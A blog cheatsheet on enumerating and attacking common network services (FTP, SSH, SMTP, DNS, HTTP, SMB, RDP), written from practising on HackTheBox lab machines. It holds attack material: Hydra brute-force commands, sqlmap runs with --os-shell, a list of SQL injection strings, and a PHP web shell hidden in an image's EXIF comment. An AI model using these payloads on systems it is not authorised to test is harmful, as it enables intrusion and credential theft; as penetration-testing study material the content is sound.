---
title: "Port Cheatsheet"
description: "How to investigate and pentest most common ports"
date: 2019-10-09
lastmod: 2020-09-12
author: "Pablo Jesús González Rubio"
cover: ""
coverAlt: ""
toc: true
tags: [ "Cheatsheet" ]
---

This post is continuosly being updated!

## 21 - FTP

Upload/Download files.

```bash
ftp <ip> -u <user> -p
```

Sometimes we can login as **anonymous** and password **pass**.

Supposing that we got creds, we can upload/download a file with:
  - *put*
  - *mget*

We can also bruteforce ftp with various tools like Hydra or Metasploit:

  ```bash
  hydra -L <user/s(.txt)> -P <pass_wordlist.txt> <IP> ftp
  ```

## 22 - SSH

Remote connection.

```bash
ssh -p <port> -i <private_key> <user>@<IP> <command>
# Port by default is 22
# Private Key is not usually needed unless server asks for it
# If server denies connections, is best to copy our public key to the server
# Command is not needed, if used it will execute the command but won't give remote connection
```

To upload/download files:

```bash
# The trick to remember 'scp' as 'dd' is:
# scp origin destination

# UPLOAD
scp <file> <user>@<IP>:<remote folder>
# DOWNLOAD
scp <user>@<IP>:<remote folder> <file>

# To do it recursively just add '-r' argument
```

We can also bruteforce ssh:

```bash
hydra -L <users(.txt)> -P <pass_wordlist.txt> <IP> ssh
hydra -L <users(.txt)> -P <pass_wordlist.txt> ssh://<IP>
hydra -l user -p password ssh://<IP>
```

There are sometimes when we get a private key or credentials but when connecting it doesn't work, then maybe there's a **knock sequence**. It's made to prevent not wanted connections and to bypass this you have to knock the ports in the sequence listed in */etc/knockd.conf*. Supposing in that file appears 571, 290, 911 we have to:

```bash
for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x <IP>; done
```

And that should open the SSH.

## 25 - SMTP

Mail Server capable of sending and receiving messages via POP3 or IMAP protocols.

Banner Grabbing:

```bash
nc <HOST> 25
```

Verify MX servers:

```bash
dig mx <HOST> +short
```

Automatically verify users from a list:

```bash
ismtp -h <IP> -l 1 -e <WORDLIST.EXT>
```

SMTP Commands:

```bash
telnet <IP> 25

HELO <domain> # Banner Grabbing

VRFY <user> # Manually Verify User

EXPN <user> # Shows email of a user

MAIL FROM:<email> # Origin of email

RCPT TO:<user> # Receiver of email

DATA # Starts the data transfer

RSET # Aborts it

QUIT

HELP # Shows help

AUTH # Authentifies client with server
```

## 53 - DNS

Domain Name Resolution.

Is used to transform IP's into a name and viceversa.

> DNS Transfer is a mechanism to replicate/copy the info. of a DNS server to other DNS servers using the AXFR protocol.

More info of records [here](https://en.wikipedia.org/wiki/List_of_DNS_record_types).

Using Dig:

```bash
# Banner Grabbing
dig version.bind CHAOS TXT <HOST>

# DNS Transfers
dig axfr <HOST>
# or
dig axfr @<HOST> <DOMAIN>
# or
dig axfr <IP> <HOST>


#Any information
dig ANY <HOST> <DOMAIN>

#Regular DNS request
dig A <HOST> <DOMAIN>

#IPv6 DNS request
dig AAAA <HOST> <DOMAIN>

#Information
dig TXT <HOST> <DOMAIN>

#Emails related
dig MX <HOST> <DOMAIN>

#DNS that resolves that name
dig NS <HOST> <DOMAIN>
```

Using Host (gives all public DNS):

```bash
# A, AAAA, MX records
host <HOST>

# To specify records
host -t <RECORD> <HOST>

# DNS Transfer
host -l <HOST> <DNS>
```

## 80 - HTTP

Web Server.

### Enumeration of directories

```bash
gobuster dir -u <IP> -w <pass_wordlist.txt> -x php,txt,html -o <output file>
dirb -u <IP> -w <pass_wordlist.txt> -X php,txt,html -o <output file>
```

We can also **fuzz** URLs to see if there might be an LFI (Local File Inclusion), it is more probable if there's some page like `/cod=1?`:

```bash
wfuzz -c -v -A -z file,<fuzz_wordlist.txt> http://192.168.1.202/FUZZ
```

It's recommended to view the source code (`ctrl + u`) and start clicking on every link as there might be directories that aren't in our wordlists.

### Technologies

If the page runs a CMS (Content Management System) we can look if there's any exploit for it or there was a vulnerability we can exploit in some way. For WordPress there's a unique tool called `wpscan`.

Discovery of this can be made through manual inspection or with the `Wappalyzer` browser plugin, which identifies CMS, Plugins, etc. on the webpage.

### Logins

Run SQLMap against logins as there might be some misconfiguration in the database that allowed us access:

```bash
sqlmap -u http://<IP> --level 5 --risk 3

# Only if you have a request file (ie.: from Burp Suite)
sqlmap -r <file.req> --level 5 --risk3
```

If we find that the database is vulnerable in any way, we can extract all tables and try to get a shell.

```bash
sqlmap -u http://<IP>/index.php?cod=1 --batch -D <table> --os-shell
# -D to dump a table
# --os-shell to get a shell
```

If there's no luck, we can try manual injections:

```mysql
'
0 OR 1=1
0 OR 1=2
" OR ""="
';--
;SELECT * FROM ALL_TABLES;
item' AND 1 = SLEEP(2);
item ' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--
;admin'='
\;';--
```

### File Uploader

If there’s some file upload we can right away go opening Burp Suite. The idea is to fool the system into thinking that we are uploading a legitimate file, but not really. Many times we can pass through the restrictions by introducing our code at the end of a file. Changing the extension but keeping the original file.

An example is to upload a photo with embedded PHP. To do it is as easy as to introduce our PHP code at the end of the image. But sometimes this won’t work, so another way is to put an EXIF comment with code with:

```
exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' test.jpg
```

And change the name of the file `test.jpg` to `test.php.jpg` as Apache server interprets both extensions. So you can execute:

```
http://somepage.com/media/uploads/test.php.jpg?cmd=uname -a
```

### APIs

Another vulnerability factor is **APIs**, they are usually on different ports but if we find one, looking at the documentation and looking for its exploits should be sufficient.

## 110 - POP3

Mail Server.

Enumeration: 

```bash
# To connect
telnet <IP> 110

# Commands:
USER <user>
PASS <pass>

LIST #List messages
RETR #Retrieve messages
QUIT
```

```bash
nmap --script=pop3* <IP>
```

We can use *Evolution* application to read mails.

## 443 - HTTPS

Everything is the same as HTTP but when using Burp, you have to download the certificate of Burp opening a new window: *`http://burp`*.

When downloaded you have to import the certificate in Firefox Settings and there you go!

And some tools may need to skip SSL certificates with one more argument. E.G:  ```nmap -k```

## 445 - SMB

Samba is one of the most useful services for enumeration.

### Enumeration

```bash
smbclient \\<IP>\ -N
#OR
smbclient -L <IP> -N
```

Once listed all files as *anonymous user* you can list the directories without the **$** this way:

```bash
smbclient \\<IP>\<directory> -N
#OR
smbclient -L <IP> -D <directory> -N
```

There's times that you anon user isn't allowed so you'll need credentials:

```bash
smbclient \\<IP>\ -U <user> -P <pass>
#OR
smbclient -L <IP> -U <user> -P <pass>
###
smbclient \\<IP>\<directory> -U <user> -P <pass>
#OR
smbclient -L <IP> -D directory -U <user> -P <pass>
```

```bash
nmap --script=smb* <IP>
```

### Bruteforcing

Hydra:

  ```bash
  hydra -L <user/s(.txt)> -P <pass_wordlist.txt> <IP> smb
  ```

Eternalblue, EternalRomance, EternalChampion, EternalSynergy exploits.

## 3389 - RDP

```bash
nmap --script=rdp-* <IP>
```

BlueKeep (Windows 2003, Windows XP, Windows 7, Server 2008, Server 2008 R2).

## EOF

I’ve tried to list all the things I encountered while breaking boxes on HTB with the most common port (according to the Nmap classification).
I will keep adding things as this should be as a complete guide to any pentest.

If you think this post needs more info, ports, or details, please contact me!
